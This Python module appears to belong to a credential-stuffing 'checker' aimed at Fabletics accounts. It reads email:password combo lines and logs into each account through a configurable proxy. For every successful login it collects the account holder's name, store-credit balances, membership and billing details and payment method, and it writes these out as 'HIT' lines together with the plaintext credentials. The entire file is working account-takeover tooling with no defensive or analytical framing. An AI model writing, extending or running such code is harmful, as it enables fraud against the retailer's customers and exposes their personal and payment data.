from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import os

from .client import FableticsAPIError, FableticsClient
from .config import DEFAULT_PROXY
from .proxy import parse_proxy


@dataclass
class CheckResult:
    status: str
    email: str
    password: str
    message: str = ""
    data: dict[str, Any] = field(default_factory=dict)

    def format_hit(self) -> str:
        if self.status != "HIT":
            return self.format_line()

        parts = [
            self.email,
            self.password,
            f"Name={self.data.get('name', 'N/A')}",
            f"MemberCredits={self.data.get('member_credits', 0)}",
            f"StoreCredit=${self.data.get('store_credit_balance', 0):.2f}",
            f"MembershipStoreCredit=${self.data.get('membership_store_credit_balance', 0):.2f}",
            f"MaxPrepaidCredits={self.data.get('max_prepaid_credits', 0)}",
            f"Membership={self.data.get('membership_status', 'N/A')}",
            f"MonthlyPrice=${self.data.get('membership_price', 0):.2f}",
            f"NextBill={self.data.get('next_billing_date', 'N/A')}",
            f"Period={self.data.get('billing_period', 'N/A')}",
            f"Due={self.data.get('billing_due', False)}",
            f"SkipAllowed={self.data.get('skip_allowed', False)}",
        ]
        return " | ".join(parts)

    def format_line(self) -> str:
        if self.status == "HIT":
            return self.format_hit()
        return f"{self.status} | {self.email}:{self.password} | {self.message}"


def _first(mapping: dict[str, Any], *keys: str, default: Any = None) -> Any:
    for key in keys:
        if key in mapping and mapping[key] not in (None, ""):
            return mapping[key]
    return default


def capture_account_data(client: FableticsClient, token: str, login_customer: dict[str, Any]) -> dict[str, Any]:
    profile = client.get(
        "/api/accounts/me/profile",
        token,
        params={"includeEmail": "true"},
    )
    membership = client.get("/api/accounts/me/membership", token)
    period = client.get("/api/accounts/me/membership/period", token)

    first_name = _first(profile, "firstName", default=_first(login_customer, "firstName", default=""))
    last_name = _first(profile, "lastName", default=_first(login_customer, "lastName", default=""))
    name = f"{first_name} {last_name}".strip() or "Unknown"

    return {
        "name": name,
        "email": _first(profile, "email", default=_first(login_customer, "email", default="")),
        "customer_id": _first(profile, "id", default=_first(login_customer, "id")),
        "member_credits": int(membership.get("availableTokenQuantity") or 0),
        "membership_credits": int(membership.get("membershipCredits") or 0),
        "store_credit_balance": float(membership.get("storeCreditBalance") or 0),
        "membership_store_credit_balance": float(membership.get("membershipStoreCreditBalance") or 0),
        "max_prepaid_credits": int(membership.get("maxPrepaidCredits") or 0),
        "membership_status": membership.get("statusLabel", "Unknown"),
        "membership_price": float(membership.get("price") or 0),
        "membership_type": membership.get("membershipTypeLabel") or membership.get("periodType"),
        "next_billing_date": membership.get("dateNextScheduled"),
        "billing_period": period.get("periodLabel"),
        "billing_due": period.get("isDue", False),
        "skip_allowed": period.get("skipAllowed", False),
        "bill_me_now_allowed": period.get("billMeNowAllowed", False),
        "membership_id": membership.get("membershipId"),
        "payment_method": membership.get("paymentMethod"),
        "in_free_trial": membership.get("inFreeTrial", False),
    }


_UNSET = object()


def resolve_proxy(proxy: str | None = None) -> str | None:
    raw = proxy if proxy is not None else os.environ.get("FABLETICS_PROXY") or DEFAULT_PROXY
    if not raw:
        return None
    return parse_proxy(raw)


def check_account(
    email: str,
    password: str,
    proxy: str | None | object = _UNSET,
    timeout: int = 30,
) -> CheckResult:
    if proxy is _UNSET:
        resolved_proxy = resolve_proxy()
    else:
        resolved_proxy = proxy
    client = FableticsClient(proxy=resolved_proxy, timeout=timeout)

    try:
        login = client.login(email, password)
        data = capture_account_data(client, login.access_token, login.customer)
        return CheckResult(status="HIT", email=email, password=password, data=data)
    except FableticsAPIError as exc:
        if exc.retryable:
            return CheckResult(
                status="RETRY",
                email=email,
                password=password,
                message=str(exc),
            )

        status_code = exc.status_code or 0
        message = str(exc).lower()

        if status_code == 403 and "authentication failed" in message:
            return CheckResult(status="FAIL", email=email, password=password, message="Invalid credentials")
        if status_code == 401:
            return CheckResult(status="RETRY", email=email, password=password, message=str(exc))

        return CheckResult(status="ERROR", email=email, password=password, message=str(exc))
    except Exception as exc:
        return CheckResult(status="ERROR", email=email, password=password, message=str(exc))


def parse_combo(line: str) -> tuple[str, str] | None:
    line = line.strip()
    if not line or line.startswith("#"):
        return None

    if ":" not in line:
        return None

    email, password = line.split(":", 1)
    email = email.strip()
    password = password.strip()
    if not email or not password:
        return None
    return email, password
